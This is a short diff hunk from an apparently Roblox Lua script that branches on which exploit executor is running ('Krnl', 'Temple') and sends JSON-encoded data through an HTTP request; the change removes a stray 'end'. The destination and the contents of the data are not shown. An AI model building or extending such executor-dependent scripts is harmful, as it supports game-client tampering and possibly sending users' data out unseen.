@@ -206,7 +206,7 @@ elseif currentExploit == "Krnl" then
             },
             Body = game:GetService("HttpService"):JSONEncode(data)
         })
-end
+
 elseif currentExploit == "Temple" then
     request(
         {
